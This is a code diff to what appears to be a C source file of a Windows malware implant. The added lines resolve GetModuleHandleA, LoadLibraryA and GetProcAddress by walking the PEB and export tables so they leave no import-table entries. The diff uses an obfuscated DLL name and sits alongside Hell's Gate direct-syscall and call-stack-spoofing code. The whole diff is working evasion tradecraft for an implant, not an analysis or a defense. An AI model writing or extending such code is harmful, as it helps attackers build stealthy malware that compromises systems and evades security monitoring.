@@ -21,6 +21,13 @@
 PVOID g_k32_ret = NULL;
 /* These are declared in syscall_stub.asm and extern'd from implant.h */
 
+/* ── IAT-bootstrap function pointers ─────────────────────────────────────── */
+/* Resolved at init time via PEB export walk so these three functions do not
+ * appear in the PE import directory (no static IAT entry). */
+pfnGetModuleHandleA_t g_GetModuleHandleA = NULL;
+pfnLoadLibraryA_t     g_LoadLibraryA     = NULL;
+pfnGetProcAddress_t   g_GetProcAddress   = NULL;
+
 /* ── Private state ────────────────────────────────────────────────────────── */
 static PVOID  s_ntdll_base  = NULL;
 static PVOID  s_syscall_gadget = NULL;  /* same as g_gadget */
@@ -177,6 +184,28 @@ static PVOID FindDllBase(const WCHAR *name, int nameChars) {
 }
 
 /*
+ * HellsGateFindExport — generic export lookup for any loaded DLL base.
+ * Used by HellsGateInit to bootstrap GetProcAddress/LoadLibraryA/GetModuleHandleA
+ * without calling those functions (which would create static IAT entries).
+ */
+static PVOID HellsGateFindExport(PVOID base, const char *name) {
+    BYTE *b = (BYTE*)base;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)b;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(b + dos->e_lfanew);
+    DWORD expRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (!expRVA) return NULL;
+    NT_EXPORT_DIR *exp = (NT_EXPORT_DIR*)(b + expRVA);
+    DWORD *funcs = (DWORD*)(b + exp->AddressOfFunctions);
+    DWORD *names = (DWORD*)(b + exp->AddressOfNames);
+    WORD  *ords  = (WORD *)(b + exp->AddressOfNameOrdinals);
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        if (strcmp((const char*)(b + names[i]), name) == 0)
+            return b + funcs[ords[i]];
+    }
+    return NULL;
+}
+
+/*
  * FindK32RetGadget — locate a lone "ret" (C3) inside kernel32.dll .text.
  * We want it inside a named exported function so call-stack unwinding shows
  * "kernel32!<FuncName>+offset" rather than an anonymous RVA.
@@ -262,6 +291,22 @@ BOOL HellsGateInit(void) {
     /* Find kernel32 ret gadget for call-stack spoofing */
     g_k32_ret = FindK32RetGadget();
     /* Non-fatal: if not found, stub falls back to unspoofed return */
+
+    /* Bootstrap IAT functions via PEB export walk — avoids static IAT entries */
+    {
+        WCHAR w_k32[16]; WOBFSTR("kernel32.dll", w_k32, 16);
+        PVOID k32base = FindDllBase(w_k32, 12);
+        if (k32base) {
+            g_GetModuleHandleA = (pfnGetModuleHandleA_t)
+                HellsGateFindExport(k32base, "GetModuleHandleA");
+            g_LoadLibraryA     = (pfnLoadLibraryA_t)
+                HellsGateFindExport(k32base, "LoadLibraryA");
+            g_GetProcAddress   = (pfnGetProcAddress_t)
+                HellsGateFindExport(k32base, "GetProcAddress");
+        }
+        if (!g_GetModuleHandleA || !g_LoadLibraryA || !g_GetProcAddress)
+            return FALSE;
+    }
 
     return TRUE;
 }
